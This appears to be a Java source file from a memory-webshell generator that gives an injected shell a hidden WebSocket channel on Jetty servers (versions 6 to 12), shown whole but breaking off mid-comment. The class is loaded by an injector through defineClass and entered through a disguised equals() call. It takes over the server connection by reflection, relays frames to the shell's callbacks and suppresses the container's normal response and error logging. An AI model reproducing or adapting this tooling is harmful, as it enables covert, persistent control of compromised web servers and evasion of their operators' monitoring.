package com.reajason.javaweb.memshell.server.jetty;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.Map;

/**
 * Jetty RawWebSocket helper 模板。
 * <p>
 * 生成期由 server 按 {@code <shellClassName>$RawWsHelper} 重命名并嵌入注入器；注入器先
 * defineClass 本类，再实例化 shell。shell 每次握手创建一个 helper 实例，调用
 * {@code helper.equals(new Object[]{request, response, this})} 后由本类接管连接：
 * 从 Request 逐层找到 Jetty 的 {@code EndPoint}，写 101 后直接在 EndPoint 上跑帧循环，
 * 并反射调用 shell 的协议回调。
 * <p>
 * 覆盖 Jetty 各代的连接抽象：
 * <ul>
 *     <li>Jetty 6/7/8：EndPoint 使用 {@code org.mortbay.io.Buffer} /
 *     {@code org.eclipse.jetty.io.Buffer}，BIO 直接走 transport 上的 Socket 流；</li>
 *     <li>Jetty 9+：EndPoint 使用 {@link ByteBuffer}，读写分别走 fill/fillInterested 与
 *     write(Callback, ...)，TLS 由 Jetty 自己解密，不需要区分连接器实现。</li>
 * </ul>
 * 本类只依赖 JDK（目标 JDK 6），不引用任何 servlet / Jetty 类型，javax 与 jakarta
 * 两种命名空间共用同一份代码。
 *
 * @author ReaJason
 */
public class JettyRawWsHelper implements Runnable, InvocationHandler {

    private static final String GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final int MAX_MESSAGE_SIZE = 50 * 1024 * 1024;
    private static final int OP_CONT = 0x0;
    private static final int OP_TEXT = 0x1;
    private static final int OP_BINARY = 0x2;
    private static final int OP_CLOSE = 0x8;
    private static final int OP_PING = 0x9;
    private static final int OP_PONG = 0xA;

    private static final int READ_POLL_TIMEOUT = 5000;
    private static final int IO_BUFFER_SIZE = 8192;

    private static final int MODE_NONE = 0;
    private static final int MODE_SOCKET = 1;
    private static final int MODE_BUFFER = 2;
    private static final int MODE_BYTE_BUFFER = 3;

    private int wireMode = MODE_NONE;
    private final byte[] singleByte = new byte[1];
    private byte[] pending;
    private int pendingIndex;

    private Socket socket;
    private InputStream input;
    private OutputStream output;

    private Object endPoint;
    private Method endpointFill;
    private Method endpointFlush;
    private Method endpointWrite;
    private Method endpointFillInterested;
    private Method endpointClose;
    private Method endpointBlockReadable;
    private Method endpointBlockWritable;
    private Object nativeBuffer;
    private Method bufferGet;
    private Method bufferPut;
    private Method bufferClear;
    private Method bufferLength;
    private ByteBuffer readBuffer;
    private Class callbackClass;
    /**
     * Jetty 9.4+ 的 Callback 同时继承 Invocable，线程策略会反射调用 getInvocationType()。
     * 代理必须返回真实的枚举值，返回 null 会让 EatWhatYouKill 的 switch 直接 NPE；
     * 9.2/9.3 没有 Invocable，这里保持 null。
     */
    private Object callbackInvocationType;

    private Object httpChannel;
    private Object coreRequest;

    private final Object writeLock = new Object();
    /**
     * Jetty 的 Callback 用 Proxy + 本类（InvocationHandler）实现；每个代理对应一个
     * {@code Object[]{done, failure}} 状态，避免在 helper 模板里引入嵌套类——helper 会被
     * ByteBuddy 重命名到任意包，嵌套类不会跟着打包。
     */
    private final Map callbacks = new IdentityHashMap();
    private volatile boolean closed;
    private Object shell;
    private Method onStart;
    private Method onReadBinary;
    private Method onReadText;
    private Method onDisconnect;
    private InputStream pumpInput;
    private Map attributes;
    private boolean hijacked;

    public JettyRawWsHelper() {
    }

    /**
     * 注入器到 helper 的唯一入口。返回 true 表示连接已被接管（101 已决定写或已写），
     * 调用方不能再回落到 FilterChain；返回 false 表示尚未接管，可安全 fallback。
     */
    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length != 3) {
            return false;
        }
        try {
            return connect(args[0], args[1], args[2]);
        } catch (Throwable ignored) {
            return hijacked;
        }
    }

    private boolean connect(Object request, Object response, Object shellObject) throws Exception {
        Object key = invoke(request, "getHeader", new Class[]{String.class}, new Object[]{"Sec-WebSocket-Key"});
        Object method = invoke(request, "getMethod", new Class[0], null);
        if (!(key instanceof String) || !"GET".equalsIgnoreCase(String.valueOf(method))) {
            return false;
        }
        String accept = acceptKey((String) key);
        if (accept == null) {
            return false;
        }
        Object endPoint = locateEndPoint(request, 0);
        if (endPoint == null || !initWire(endPoint)) {
            return false;
        }
        // 握手头解析时容器可能把紧随其后的帧一起读进了 HTTP 请求缓冲，EndPoint 看不到这部分字节
        drainHttpBuffers();

        this.shell = shellObject;
        this.onStart = findMethod(shellObject, "onStart", new Class[]{Object.class});
        this.onReadBinary = findMethod(shellObject, "onReadBinary", new Class[]{Object.class, byte[].class});
        this.onReadText = findMethod(shellObject, "onReadText", new Class[]{Object.class, String.class});
        this.onDisconnect = findMethod(shellObject, "onDisconnect", new Class[]{Object.class});
        this.hijacked = true;

        try {
            writeHandshake(accept);
        } catch (Throwable t) {
            suppressContainerResponse();
            closeConnection();
            return true;
        }
        invokeQuietly(onStart, shell, new Object[]{this});
        try {
            frameLoop();
        } catch (Throwable ignored) {
        } finally {
            invokeQuietly(onDisconnect, shell, new Object[]{this});
            closeConnection();
        }
        return true;
    }

    // ---------------------------------------------------------------- 连接后端

    /**
     * 从容器传入的 request 逐层定位 EndPoint。Jetty 各代混用了字段、包装类和接口：
     * 6/7/8 的 Request 直接持有 {@code _endp}；9.x~11 的 Request 持有 {@code _channel}
     * （HttpChannel），channel 再持有 {@code _endPoint}；12 的 Request 是接口，
     * EE 的 ServletApiRequest 包着 ServletContextRequest/ServletChannel，最终从
     * ConnectionMetaData.getConnection() 取到 AbstractConnection 的 {@code _endPoint}。
     */
    private Object locateEndPoint(Object target, int depth) {
        if (target == null || depth > 8) {
            return null;
        }
        if (isEndPoint(target)) {
            return target;
        }
        if (coreRequest == null
                && (hasMethod(target, "setHandled", new Class[]{boolean.class})
                || (hasMethod(target, "getConnectionMetaData", new Class[0])
                && hasMethod(target, "fail", new Class[]{Throwable.class})))) {
            coreRequest = target;
        }
        String[] names = {"_endp", "_endPoint", "_channel", "_servletChannel",
                "_servletContextRequest", "_connection", "_request", "request", "_connectionMetaData"};
        for (int i = 0; i < names.length; i++) {
            Object value = getField(target, names[i]);
            if (value == null) {
                continue;
            }
            if (isEndPoint(value)) {
                return value;
            }
            if (httpChannel == null && value.getClass().getName().indexOf("HttpChannel") >= 0) {
                httpChannel = value;
            }
            Object found = locateEndPoint(value, depth + 1);
            if (found != null) {
                return found;
            }
        }
        Object channel = invoke(target, "getHttpChannel", new Class[0], null);
        if (channel != null) {
            if (httpChannel == null) {
                httpChannel = channel;
            }
            Object found = locateEndPoint(channel, depth + 1);
            if (found != null) {
                return found;
            }
        }
        Object metaData = invoke(target, "getConnectionMetaData", new Class[0], null);
        if (metaData != null) {
            Object found = locateEndPoint(metaData, depth + 1);
            if (found != null) {
                return found;
            }
        }
        return null;
    }

    private boolean initWire(Object endPoint) {
        Method fill = findNamedMethod(endPoint, "fill", 1);
        if (fill == null) {
            return false;
        }
        Class parameterType = fill.getParameterTypes()[0];
        if (parameterType == ByteBuffer.class) {
            return initByteBufferEndpoint(endPoint, fill);
        }
        Object transport = invoke(endPoint, "getTransport", new Class[0], null);
        if (transport instanceof Socket) {
            return initSocket(endPoint, (Socket) transport);
        }
        return initNativeEndpoint(endPoint, fill, parameterType);
    }

    private boolean initSocket(Object endPoint, Socket socket) {
        try {
            // 读轮询超时：网络分区（无 RST）时裸 read 会永久钉住读线程；
            // 超时抛 SocketTimeoutException，由 readWire 转成"暂无数据"回到轮询循环
            socket.setSoTimeout(READ_POLL_TIMEOUT);
            socket.setTcpNoDelay(true);
            this.input = socket.getInputStream();
            this.output = socket.getOutputStream();
        } catch (Throwable t) {
            return false;
        }
        this.socket = socket;
        this.endPoint = endPoint;
        this.endpointClose = findMethod(endPoint, "close", new Class[0]);
        this.wireMode = MODE_SOCKET;
        return true;
    }

    /**
     * Jetty 6/7/8：EndPoint 走 Buffer 接口。NIO 连接器只接受 NIOBuffer 实现，
     * 这里按 Jetty 的包名前缀（mortbay / eclipse）反射创建对应的 IndirectNIOBuffer。
     */
    private boolean initNativeEndpoint(Object endPoint, Method fill, Class bufferType) {
        Object transport = invoke(endPoint, "getTransport", new Class[0], null);
        if (!(transport instanceof java.nio.channels.ByteChannel)) {
            return false;
        }
        String prefix = endPoint.getClass().getName().startsWith("org.mortbay.")
                ? "org.mortbay" : "org.eclipse.jetty";
        Object buffer;
        Method get;
        Method put;
        Method clear;
        Method length;
        try {
            Class bufferClass = Class.forName(prefix + ".io.nio.IndirectNIOBuffer", true,
                    endPoint.getClass().getClassLoader());
            Constructor constructor = bufferClass.getConstructor(new Class[]{int.class});
            buffer = constructor.newInstance(new Object[]{Integer.valueOf(IO_BUFFER_SIZE)});
            get = bufferClass.getMethod("get", new Class[]{byte[].class, int.class, int.class});
            put = bufferClass.getMethod("put", new Class[]{byte[].class, int.class, int.class});
            clear = bufferClass.getMethod("clear", new Class[0]);
            length = bufferClass.getMethod("length", new Class[0]);
        } catch (Throwable t) {
            return false;
        }
        Method flush = findMethod(endPoint, "flush", new Class[]{bufferType});
        Method close = findMethod(endPoint, "close", new Class[0]);
        if (flush == null || close == null) {
            return false;
        }
        this.endPoint = endPoint;
        this.endpointFill = fill;
        this.endpointFlush = flush;
        this.endpointBlockReadable = findMethod(endPoint, "blockReadable", new Class[]{long.class});
        this.endpointBlockWritable = findMethod(endPoint, "blockWritable", new Class[]{long.class});
        this.endpointClose = close;
        this.nativeBuffer = buffer;
        this.bufferGet = get;
        this.bufferPut = put;
        this.bufferClear = clear;
        this.bufferLength = length;
        setIdleTimeout(endPoint);
        this.wireMode = MODE_BUFFER;
        return true;
    }

    /**
     * Jetty 9+：EndPoint 用 ByteBuffer，读取先 fill，无数据时 fillInterested 等待
     * 选择器回调；写入用 write(Callback, ByteBuffer...) 等回调完成。TLS 连接器下
     * EndPoint 已经封装了加解密。
     */
    private boolean initByteBufferEndpoint(Object endPoint, Method fill) {
        try {
            this.callbackClass = Class.forName("org.eclipse.jetty.util.Callback", false,
                    endPoint.getClass().getClassLoader());
            try {
                Method getInvocationType = callbackClass.getMethod("getInvocationType", new Class[0]);
                this.callbackInvocationType = getInvocationType.getReturnType()
                        .getField("BLOCKING").get(null);
            } catch (NoSuchMethodException ignored) {
                // Jetty 9.2/9.3 的 Callback 还没有 Invocable，没有这个方法，代理不必返回枚举值
                this.callbackInvocationType = null;
            }
        } catch (Throwable t) {
            return false;
        }
        Method fillInterested = findMethod(endPoint, "fillInterested", new Class[]{callbackClass});
        Method write = findWriteMethod(endPoint);
        Method close = findMethod(endPoint, "close", new Class[0]);
        if (fillInterested == null || write == null || close == null) {
            return false;
        }
        this.endPoint = endPoint;
        this.endpointFill = fill;
        this.endpointFillInterested = fillInterested;
        this.endpointWrite = write;
        this.endpointClose = close;
        setIdleTimeout(endPoint);
        this.readBuffer = ByteBuffer.allocate(IO_BUFFER_SIZE);
        // EndPoint.fill 内部走 BufferUtil.flipToFill：limit == capacity 会被当成“还有未读数据”
        // 而执行 compact，把 position 推到 capacity，随后 SocketChannel.read 永远只能读 0。
        // Jetty 约定参与 fill 的缓冲区以“已刷出”状态（position == limit == 0）传入。
        this.readBuffer.limit(0);
        this.wireMode = MODE_BYTE_BUFFER;
        return true;
    }

    private static Method findWriteMethod(Object target) {
        Method[] methods = target.getClass().getMethods();
        for (int i = 0; i < methods.length; i++) {
            Method method = methods[i];
            if (!"write".equals(method.getName())) {
                continue;
            }
            Class[] parameterTypes = method.getParameterTypes();
            if (parameterTypes.length == 2
                    && parameterTypes[0].getName().equals("org.eclipse.jetty.util.Callback")
                    && parameterTypes[1] == ByteBuffer[].class) {
                return method;
            }
        }
        return null;
    }

    private static void setIdleTimeout(Object endPoint) {
        try {
            endPoint.getClass().getMethod("setIdleTimeout", new Class[]{long.class})
                    .invoke(endPoint, new Object[]{Long.valueOf(0L)});
            return;
        } catch (Throwable ignored) {
        }
        try {
            endPoint.getClass().getMethod("setMaxIdleTime", new Class[]{int.class})
                    .invoke(endPoint, new Object[]{Integer.valueOf(0)});
        } catch (Throwable ignored) {
        }
    }

    /**
     * 握手请求解析后，紧随其后的 WebSocket 帧可能已经被 HTTP 解析器读进自己的缓冲，
     * 这部分字节不在 socket/SSL 上，EndPoint.fill 永远读不到，必须在进入帧循环前搬走。
     * <p>
     * Jetty 9.2+ 的 HttpConnection 提供 onUpgradeFrom()，返回的 ByteBuffer 就是未消费数据；
     * Jetty 6/7/8 没有这个入口，残留数据在 HttpParser 的 header Buffer 里。两处都只读，
     * 不改变容器状态；当前线程不在请求分发中（拿不到连接）时直接跳过。
     */
    private void drainHttpBuffers() {
        try {
            Object connection = currentHttpConnection();
            if (connection == null) {
                return;
            }
            Method onUpgradeFrom = findMethod(connection, "onUpgradeFrom", new Class[0]);
            if (onUpgradeFrom != null) {
                Object unconsumed = invoke(connection, "onUpgradeFrom", new Class[0], null);
                if (unconsumed instanceof ByteBuffer) {
                    appendByteBuffer((ByteBuffer) unconsumed);
                }
                return;
            }
            Object parser = invoke(connection, "getParser", new Class[0], null);
            Object header = getField(parser, "_header");
            if (header == null) {
                header = getField(parser, "_buffer");
            }
            appendNativeBuffer(header);
        } catch (Throwable ignored) {
        }
    }

    /**
     * Jetty 各代的当前连接类名不同：6 是 mortbay，7/8 是 AbstractHttpConnection，
     * 9~11 是 org.eclipse.jetty.server.HttpConnection，12 挪到了 internal 包。
     * getCurrentConnection() 都是 public static，且在同步分发期间由容器设置。
     */
    private Object currentHttpConnection() {
        String[] classNames = {
                "org.eclipse.jetty.server.HttpConnection",
                "org.eclipse.jetty.server.internal.HttpConnection",
                "org.eclipse.jetty.server.AbstractHttpConnection",
                "org.mortbay.jetty.HttpConnection"
        };
        ClassLoader loader = getClass().getClassLoader();
        for (int i = 0; i < classNames.length; i++) {
            try {
                Class clazz = Class.forName(classNames[i], false, loader);
                Method current = clazz.getMethod("getCurrentConnection", new Class[0]);
                Object connection = current.invoke(null);
                if (connection != null) {
                    return connection;
                }
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    private void appendByteBuffer(ByteBuffer buffer) {
        if (buffer == null || !buffer.hasRemaining()) {
            return;
        }
        byte[] data = new byte[buffer.remaining()];
        buffer.get(data);
        appendPending(data, 0, data.length);
    }

    /**
     * Jetty 6/7/8 的 Buffer 没有剩余字节访问器，length() 是 getIndex~putIndex 之间的可读长度，
     * get(byte[],int,int) 读取并消费。
     */
    private void appendNativeBuffer(Object buffer) {
        if (buffer == null) {
            return;
        }
        Object length = invoke(buffer, "length", new Class[0], null);
        if (!(length instanceof Integer) || ((Integer) length).intValue() <= 0) {
            return;
        }
        int size = ((Integer) length).intValue();
        byte[] data = new byte[size];
        try {
            Method get = buffer.getClass().getMethod("get",
                    new Class[]{byte[].class, int.class, int.class});
            Object count = get.invoke(buffer, new Object[]{data, Integer.valueOf(0), Integer.valueOf(size)});
            if (count instanceof Integer) {
                int read = ((Integer) count).intValue();
                int offset = read > 0 && data[0] == (byte) 0x0A ? 1 : 0;
                // Jetty 6 在 header 结束处只消费掉 CR，CRLF 的 LF 会留在缓冲区；
                // 合法 WebSocket 帧首字节不可能是 0x0A，跳过它不会误删帧数据。
                appendPending(data, offset, read - offset);
            }
        } catch (Throwable ignored) {
        }
    }

    private void appendPending(byte[] data, int offset, int size) {
        if (data == null || size <= 0) {
            return;
        }
        if (offset < 0) {
            offset = 0;
        }
        if (size > data.length - offset) {
            size = data.length - offset;
        }
        int left = pending == null ? 0 : pending.length - pendingIndex;
        byte[] merged = new byte[left + size];
        if (left > 0) {
            System.arraycopy(pending, pendingIndex, merged, 0, left);
        }
        System.arraycopy(data, offset, merged, left, size);
        this.pending = merged;
        this.pendingIndex = 0;
    }

    // ---------------------------------------------------------------- 原始字节读写

    private int readWire(byte[] buffer, int offset, int length) throws IOException {
        if (length <= 0) {
            return 0;
        }
        if (pending != null && pendingIndex < pending.length) {
            int count = pending.length - pendingIndex;
            if (count > length) {
                count = length;
            }
            System.arraycopy(pending, pendingIndex, buffer, offset, count);
            pendingIndex += count;
            if (pendingIndex >= pending.length) {
                pending = null;
                pendingIndex = 0;
            }
            return count;
        }
        if (wireMode == MODE_SOCKET) {
            try {
                if (length == 1) {
                    // 帧头和掩码按单字节读取；BIO 流没有内部缓冲，一次读满再逐字节消费，
                    // 避免每个字节一次 socket read。payload 等大块读取仍直达调用方缓冲区。
                    byte[] data = new byte[IO_BUFFER_SIZE];
                    int count = input.read(data, 0, data.length);
                    if (count <= 0) {
                        return count;
                    }
                    byte[] filled = new byte[count];
                    System.arraycopy(data, 0, filled, 0, count);
                    this.pending = filled;
                    this.pendingIndex = 0;
                    return readWire(buffer, offset, length);
                }
                return input.read(buffer, offset, length);
            } catch (SocketTimeoutException e) {
                // 读轮询超时=暂无数据，返回 0；调用方回到循环顶检查 closed，
                // close() 后最多一个 READ_POLL_TIMEOUT 周期内读循环退出
                return 0;
            }
        }
        if (wireMode == MODE_BUFFER) {
            return readNative(buffer, offset, length);
        }
        if (wireMode == MODE_BYTE_BUFFER) {
            return readByteBuffer(buffer, offset, length);
        }
        return -1;
    }

    private int readWireByte() throws IOException {
        while (!closed) {
            int count = readWire(singleByte, 0, 1);
            if (count > 0) {
                return singleByte[0] & 0xFF;
            }
            if (count < 0) {
                return -1;
            }
            // 超时或暂时无数据，回到循环顶检查 closed
        }
        return -1;
    }

    private void readFully(byte[] buffer, int offset, int length) throws IOException {
        int read = 0;
        while (read < length) {
            int count = readWire(buffer, offset + read, length - read);
            if (count < 0) {
                throw new IOException("unexpected EOF");
            }
            if (count == 0) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                continue;
            }
            read += count;
        }
    }

    /**
     * 按帧头声明长度立即分配会被恶意大帧撑爆内存；分块读入、按全局偏移解掩码，
     * ByteArrayOutputStream 初始容量封顶在 IO_BUFFER_SIZE。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        int chunkSize = Math.min(total, IO_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private int readNative(byte[] buffer, int offset, int length) throws IOException {
        while (!closed) {
            int count = invokeInt(endpointFill, endPoint, new Object[]{nativeBuffer});
            if (count > 0) {
                byte[] data = new byte[count];
                try {
                    bufferGet.invoke(nativeBuffer, new Object[]{data, Integer.valueOf(0), Integer.valueOf(count)});
                } catch (Throwable t) {
                    throw new IOException("buffer get failed: " + t);
                } finally {
                    try {
                        bufferClear.invoke(nativeBuffer, new Object[0]);
                    } catch (Throwable ignored) {
                    }
                }
                this.pending = data;
                this.pendingIndex = 0;
                return readWire(buffer, offset, length);
            }
            if (count < 0) {
                return -1;
            }
            if (endpointBlockReadable != null) {
                try {
                    endpointBlockReadable.invoke(endPoint, new Object[]{Long.valueOf(READ_POLL_TIMEOUT)});
                } catch (Throwable ignored) {
                }
            } else {
                sleepQuietly();
            }
        }
        return -1;
    }

    private int readByteBuffer(byte[] buffer, int offset, int length) throws IOException {
        while (!closed) {
            int count = invokeInt(endpointFill, endPoint, new Object[]{readBuffer});
            if (count > 0) {
                byte[] data = new byte[count];
                readBuffer.get(data, 0, count);
                this.pending = data;
                this.pendingIndex = 0;
                return readWire(buffer, offset, length);
            }
            if (count < 0) {
                return -1;
            }
            awaitReadable();
        }
        return -1;
    }

    /**
     * EndPoint.fill 非阻塞，0 表示当前无数据；注册一次读事件，等选择器回调唤醒。
     * 注册失败（例如容器自己还挂着 fill interest）时退化为短暂轮询。
     */
    private void awaitReadable() throws IOException {
        Object[] state = newState();
        try {
            Object callback = newCallback(state);
            endpointFillInterested.invoke(endPoint, new Object[]{callback});
        } catch (Throwable t) {
            sleepQuietly();
            return;
        }
        while (!isDone(state) && !closed) {
            await(state, READ_POLL_TIMEOUT);
        }
    }

    private void writeWire(byte[] data, int offset, int length) throws IOException {
        if (length <= 0) {
            return;
        }
        if (wireMode == MODE_SOCKET) {
            output.write(data, offset, length);
            return;
        }
        if (wireMode == MODE_BUFFER) {
            writeNative(data, offset, length);
            return;
        }
        if (wireMode == MODE_BYTE_BUFFER) {
            writeByteBuffer(data, offset, length);
        }
    }

    private void writeNative(byte[] data, int offset, int length) throws IOException {
        int position = offset;
        int remaining = length;
        while (remaining > 0) {
            int chunk = Math.min(remaining, IO_BUFFER_SIZE);
            try {
                bufferClear.invoke(nativeBuffer, new Object[0]);
                bufferPut.invoke(nativeBuffer, new Object[]{data, Integer.valueOf(position), Integer.valueOf(chunk)});
            } catch (Throwable t) {
                throw new IOException("buffer put failed: " + t);
            }
            while (true) {
                if (closed) {
                    throw new IOException("connection closed");
                }
                int count = invokeInt(endpointFlush, endPoint, new Object[]{nativeBuffer});
                if (count < 0) {
                    throw new IOException("connection closed");
                }
                if (invokeIntQuietly(bufferLength, nativeBuffer) <= 0) {
                    break;
                }
                if (endpointBlockWritable != null) {
                    try {
                        endpointBlockWritable.invoke(endPoint, new Object[]{Long.valueOf(READ_POLL_TIMEOUT)});
                    } catch (Throwable ignored) {
                    }
                } else {
                    sleepQuietly();
                }
            }
            position += chunk;
            remaining -= chunk;
        }
    }

    private void writeByteBuffer(byte[] data, int offset, int length) throws IOException {
        ByteBuffer buffer = ByteBuffer.wrap(data, offset, length);
        while (buffer.hasRemaining()) {
            if (closed) {
                throw new IOException("connection closed");
            }
            Object[] state = newState();
            Object callback;
            try {
                callback = newCallback(state);
            } catch (Throwable t) {
                throw new IOException("callback create failed: " + t);
            }
            try {
                endpointWrite.invoke(endPoint, new Object[]{callback, new ByteBuffer[]{buffer}});
            } catch (InvocationTargetException e) {
                throw new IOException("write failed: " + e.getCause());
            } catch (Throwable t) {
                throw new IOException("write failed: " + t);
            }
            while (!isDone(state) && !closed) {
                await(state, READ_POLL_TIMEOUT);
            }
            if (getFailure(state) != null) {
                throw new IOException("write failed: " + getFailure(state));
            }
            if (!isDone(state)) {
                throw new IOException("connection closed");
            }
        }
    }

    private void flushWire() throws IOException {
        if (wireMode == MODE_SOCKET) {
            output.flush();
        }
        // Buffer/ByteBuffer 模式的 flush/write 已经保证数据离开本进程
    }

    private void closeConnection() {
        if (closed) {
            return;
        }
        closed = true;
        if (wireMode == MODE_SOCKET) {
            closeQuietly(output);
            closeQuietly(input);
            closeQuietly(socket);
        } else if (endpointClose != null) {
            try {
                endpointClose.invoke(endPoint, new Object[0]);
            } catch (Throwable ignored) {
            }
        }
        suppressContainerResponse();
        this.socket = null;
        this.input = null;
        this.output = null;
        this.endPoint = null;
    }

    /**
     * 连接已经被本类拿走，容器返回时不能再按普通请求收尾：先标记 request handled，
     * 否则 Jetty 会在 doFilter 返回后往已关闭的连接补一个 404，日志里留下
     * SendCallback[CLOSED] 的 IllegalStateException；随后再用 HttpChannel.abort
     * （9.2+）或 Request.fail（12）告诉通道不要再复用这条连接。
     */
    private void suppressContainerResponse() {
        if (coreRequest != null) {
            invoke(coreRequest, "setHandled", new Class[]{boolean.class}, new Object[]{Boolean.TRUE});
        }
        Throwable failure = new IOException("websocket connection taken over");
        if (httpChannel != null && !isJetty12EeChannel(httpChannel)) {
            Method abort = findMethod(httpChannel, "abort", new Class[]{Throwable.class});
            if (abort != null) {
                try {
                    abort.invoke(httpChannel, new Object[]{failure});
                    return;
                } catch (Throwable ignored) {
                }
            }
            abort = findMethod(httpChannel, "abort", new Class[0]);
            if (abort != null) {
                try {
                    abort.invoke(httpChannel, new Object[0]);
                    return;
                } catch (Throwable ignored) {
                }
            }
        }
        if (coreRequest != null) {
            Method fail = findMethod(coreRequest, "fail", new Class[]{Throwable.class});
            if (fail != null) {
                try {
                    fail.invoke(coreRequest, new Object[]{failure});
                    return;
                } catch (Throwable ignored) {
                }
            }
            invoke(coreRequest, "setHandled", new Class[]{boolean.class}, new Object[]{Boolean.TRUE});
        }
    }

    /**
     * Jetty 12 的 EE 层另有一份 HttpChannel（如 org.eclipse.jetty.ee8.nested.HttpChannel），
     * 它的 abort(Throwable) 会把请求标记为失败并让容器补写 500 错误页，日志里留下
     * writeError 的 WARN；EE8 的 servlet Request 又没有 fail(Throwable)。连接已经由本类
     * 关闭、request 也已 setHandled，这类通道上只保留 setHandled，交给 EE 层自行收尾。
     */
    private static boolean isJetty12EeChannel(Object channel) {
        return channel.getClass().getName().startsWith("org.eclipse.jetty.ee");
    }

    // ---------------------------------------------------------------- 协议

    private void writeHandshake(String accept) throws IOException {
        String response = "HTTP/1.1 101 Switching Protocols\r\n"
                + "Upgrade: websocket\r\n"
                + "Connection: Upgrade\r\n"
                + "X-Accel-Buffering: no\r\n"
                + "Sec-WebSocket-Accept: " + accept + "\r\n"
                + "\r\n";
        byte[] data = response.getBytes(UTF8);
        synchronized (writeLock) {
            writeWire(data, 0, data.length);
            flushWire();
        }
    }

    private void frameLoop() {
        ByteArrayOutputStream fragments = null;
        int fragmentOpcode = -1;
        try {
            while (!closed) {
                int b1 = readWireByte();
                if (b1 == -1) {
                    break;
                }
                boolean fin = (b1 & 0x80) != 0;
                int opcode = b1 & 0x0F;
                if ((b1 & 0x70) != 0) {
                    closeWith(1002, "unexpected reserved bits");
                    return;
                }

                int b2 = readWireByte();
                if (b2 == -1) {
                    break;
                }
                boolean masked = (b2 & 0x80) != 0;
                long length = b2 & 0x7F;
                if (length == 126) {
                    int b3 = readWireByte();
                    int b4 = readWireByte();
                    if ((b3 | b4) < 0) {
                        return;
                    }
                    length = ((long) b3 << 8) | b4;
                } else if (length == 127) {
                    length = 0;
                    for (int i = 0; i < 8; i++) {
                        int b = readWireByte();
                        if (b < 0) {
                            return;
                        }
                        length = (length << 8) | b;
                    }
                }
                if (length < 0 || length > MAX_MESSAGE_SIZE) {
                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    if (message.length == 1) {
                        closeWith(1002, "invalid close frame");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    closeConnection();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
                flushWire();
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        closeConnection();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
